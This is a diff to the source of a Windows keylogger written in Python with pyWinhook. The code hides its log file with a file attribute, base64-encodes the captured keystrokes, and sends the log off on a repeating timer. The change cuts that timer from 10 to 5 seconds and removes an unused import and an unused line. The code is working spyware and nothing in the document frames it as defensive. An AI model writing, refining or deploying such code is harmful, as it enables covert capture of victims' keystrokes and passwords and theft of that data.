@@ -1,4 +1,4 @@
-import pyWinhook, pythoncom, socket, os
+import pyWinhook, pythoncom, os
 import threading
 from src import base64cipher
 from src import newServer
@@ -11,7 +11,6 @@ filepath = "log.txt"
 def hide():
     if os.path.exists(filepath):
         p = os.popen('attrib +h ' + filepath)
-        t = p.read()
         p.close()
     else:
         file = open(filepath, "w+", encoding='utf-8')
@@ -41,6 +40,7 @@ def writeToFile(s):
     msg = encodeTXT(s)
     file.write(msg)
 
+
 # Encode using base64 cipher
 def encodeTXT(s):
     return base64cipher.encodeMsg(s)
@@ -60,8 +60,8 @@ def start():
 
 
 def send(ot):
-    # wait 10 sec and send the log
-    threading.Timer(interval=10, function=send, args=(ot,)).start()
+    # wait 5 sec and send the log
+    threading.Timer(interval=5, function=send, args=(ot,)).start()
     ot.send_file()
 
 
